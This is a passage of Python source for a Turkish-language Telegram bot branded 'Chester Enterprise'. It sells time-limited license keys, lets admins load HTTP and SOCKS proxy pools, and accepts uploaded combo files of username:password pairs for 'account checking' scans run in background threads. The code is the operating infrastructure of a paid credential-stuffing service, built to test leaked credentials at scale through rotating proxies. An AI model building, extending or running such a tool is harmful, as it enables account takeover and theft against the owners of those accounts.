    row = cursor.execute("SELECT duration_days, status FROM keys WHERE key_code = ?", (key_input,)).fetchone()
    if not row or row[1] != "unused":
        bot.reply_to(message, "❌ Geçersiz veya kullanılmış lisans kodu!")
        conn.close(); return
    days = row[0]
    exp = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H-%M-%S")
    cursor.execute("UPDATE keys SET status = 'used' WHERE key_code = ?", (key_input,))
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, role, expire_date) VALUES (?, ?, 'user', ?)", (uid, message.from_user.username or "Anonim", exp))
    conn.commit(); conn.close()
    bot.reply_to(message, f"🎉 Lisans başarıyla tanımlandı! Üyelik Süresi: `{days}` Gün. /start yazarak menüyü açabilirsiniz.", parse_mode="Markdown")

# ======================================================================
# CALLBACK DISPATCHER
# ======================================================================

@bot.callback_query_handler(func=lambda call: True)
def central_callback_dispatcher(call):
    uid = call.from_user.id
    chat_id = call.message.chat.id
    mid = call.message.message_id
    auth, role = check_access(uid)
    
    if call.data == "nav_home":
        if not auth: return
        bot.edit_message_text("🎭 *Chester Enterprise Workspace*", chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=menu_main_keyboard(uid))
        return
    if call.data == "nav_my_status":
        conn = sqlite3.connect(DB_NAME)
        r = conn.cursor().execute("SELECT expire_date FROM users WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        bot.answer_callback_query(call.id, f"Rol: {role.upper()} | Bitiş: {r[0] if r else 'N/A'}", show_alert=True)
        return
    if call.data == "nav_modules":
        if not auth: return
        if proxy_pool.get_count() == 0:
            bot.answer_callback_query(call.id, "❌ Sistemde proxy yok! Önce admin proxy yüklemelidir.", show_alert=True)
            return
        bot.edit_message_text("🚀 *Kullanmak istediğiniz hesap kontrol modülünü seçin:*", chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=menu_modules_keyboard())
        return
    if call.data.startswith("modsel_"):
        if not auth: return
        target_mod = call.data.split("_")[1]
        if chat_id in active_sessions:
            bot.answer_callback_query(call.id, "⚠️ Aktif taramanız sürüyor!", show_alert=True)
            return
        user_states[uid] = target_mod
        msg = bot.send_message(chat_id, f"📥 *{target_mod.upper()}* için kontrol edilecek combo `.txt` dosyasını gönderin:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_receive_combo_file)
        return
    if call.data == "run_stop_scan":
        if chat_id in active_sessions:
            active_sessions[chat_id].is_running = False
            bot.answer_callback_query(call.id, "🛑 Durduruluyor...", show_alert=True)
        return

    # --- ADMİN PANEL CALLBACKS ---
    if call.data.startswith("adm_"):
        if not is_privileged(uid):
            bot.answer_callback_query(call.id, "⛔ Yetkiniz yok!", show_alert=True)
            return
        if call.data == "adm_dashboard": show_admin_panel_ui(chat_id, mid); return
        if call.data == "adm_proxy_hub": show_proxy_manager_ui(chat_id, mid); return
        if call.data == "adm_key_hub": show_key_manager_ui(chat_id, mid); return
        
        if call.data.startswith("adm_prompt_px_"):
            p_type = call.data.split("_")[3]
            user_states[uid] = f"addproxy_{p_type}"
            m = bot.send_message(chat_id, f"🌐 *{p_type.upper()}* yükleme alanı.\n\nİster *Doğrudan proxy içeren .txt dosyasını gönderin*, ister proxyleri satır satır buraya *mesaj olarak yazın*:")
            bot.register_next_step_handler(m, step_bulk_proxy_save)
            return
        if call.data == "adm_clear_px":
            conn = sqlite3.connect(DB_NAME); conn.cursor().execute("DELETE FROM proxies"); conn.commit(); conn.close()
            proxy_pool.reload_pool()
            bot.answer_callback_query(call.id, "🗑️ Tüm havuz temizlendi!", show_alert=True)
            show_proxy_manager_ui(chat_id, mid); return
        if call.data.startswith("adm_gen_"):
            days = int(call.data.split("_")[2])
            new_key = f"CHESTER-{days}D-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
            conn = sqlite3.connect(DB_NAME); conn.cursor().execute("INSERT INTO keys (key_code, duration_days, status, created_by) VALUES (?, ?, 'unused', ?)", (new_key, days, uid)); conn.commit(); conn.close()
            bot.send_message(chat_id, f"🔑 *Yeni Key:* `{new_key}` ({days} Gün)", parse_mode="Markdown")
            show_key_manager_ui(chat_id, mid); return

# ======================================================================
# UI RENDER KONTROLLERİ
# ======================================================================

def show_admin_panel_ui(chat_id, mid):
    conn = sqlite3.connect(DB_NAME); cursor = conn.cursor()
    u = cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    k = cursor.execute("SELECT COUNT(*) FROM keys WHERE status='unused'").fetchone()[0]
    p = cursor.execute("SELECT COUNT(*) FROM proxies").fetchone()[0]; conn.close()
    txt = f"🛡️ *CHESTER ADMİN PANELİ*\n\nÜyeler: `{u}` | Keyler: `{k}` | Proxyler: `{p}`"
    kb = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("🌐 Proxy Ayarları", callback_data="adm_proxy_hub"), InlineKeyboardButton("🔑 Key Üret", callback_data="adm_key_hub")).add(InlineKeyboardButton("🔙 Ana Menü", callback_data="nav_home"))
    bot.edit_message_text(txt, chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=kb)

def show_proxy_manager_ui(chat_id, mid):
    txt = "🌐 *PROXY KONTROL MERKEZİ*\n\nYüklemek istediğiniz proxy tipini seçin:"
    kb = InlineKeyboardMarkup(row_width=3).add(InlineKeyboardButton("HTTP", callback_data="adm_prompt_px_http"), InlineKeyboardButton("SOCKS4", callback_data="adm_prompt_px_socks4"), InlineKeyboardButton("SOCKS5", callback_data="adm_prompt_px_socks5")).add(InlineKeyboardButton("🗑️ Havuzu Temizle", callback_data="adm_clear_px"), InlineKeyboardButton("🔙 Panel", callback_data="adm_dashboard"))
    bot.edit_message_text(txt, chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=kb)

def show_key_manager_ui(chat_id, mid):
    txt = "🔑 *LİSANS MOTORU*\n\nSüre seçin:"
    kb = InlineKeyboardMarkup(row_width=3).add(InlineKeyboardButton("1 Gün", callback_data="adm_gen_1"), InlineKeyboardButton("7 Gün", callback_data="adm_gen_7"), InlineKeyboardButton("30 Gün", callback_data="adm_gen_30")).add(InlineKeyboardButton("🔙 Panel", callback_data="adm_dashboard"))
    bot.edit_message_text(txt, chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=kb)
# --- EKSİK FONKSİYON TANIMLARI ---

def step_receive_combo_file(message):
    chat_id = message.chat.id
    uid = message.from_user.id
    target_mod = user_states.get(uid)
    
    if not target_mod:
        bot.send_message(chat_id, "⚠️ Hata: Modül seçimi kayboldu.")
        return

    combos = []
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            combos = downloaded.decode('utf-8', errors='ignore').splitlines()
        except Exception as e:
            bot.send_message(chat_id, f"❌ Dosya okuma hatası: {e}")
            return
    elif message.text:
        combos = message.text.splitlines()
    
    combos = [c.strip() for c in combos if ":" in c]
    
    if not combos:
        bot.send_message(chat_id, "❌ Geçerli combo bulunamadı.")
        return
        
    bot.send_message(chat_id, f"🚀 *{target_mod.upper()}* taraması başlatılıyor. {len(combos)} hesap işlenecek.", parse_mode="Markdown")
    threading.Thread(target=core_pipeline_executor, args=(chat_id, combos, target_mod)).start()

def step_bulk_proxy_save(message):
    chat_id = message.chat.id
    uid = message.from_user.id
    state = user_states.get(uid, "")
    
    if not state.startswith("addproxy_"): return
    p_type = state.split("_")[1]
    
    raw_data = ""
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            raw_data = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        except:
            bot.send_message(chat_id, "❌ Dosya okunamadı.")
            return
    else:
        raw_data = message.text
        
    lines = [l.strip() for l in raw_data.splitlines() if l.strip()]
    
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    for line in lines:
        try:
            cursor.execute("INSERT OR IGNORE INTO proxies (proxy_str, proxy_type) VALUES (?, ?)", (line, p_type))
        except: continue
    conn.commit()
    conn.close()
    
    proxy_pool.reload_pool()
    bot.send_message(chat_id, f"✅ {len(lines)} adet {p_type.upper()} proxy havuza eklendi!")

# --- BOTU BAŞLATMA SATIRI ---
if __name__ == "__main__":
    print("Chester Enterprise Bot Aktif.")
    bot.infinity_polling(none_stop=True)
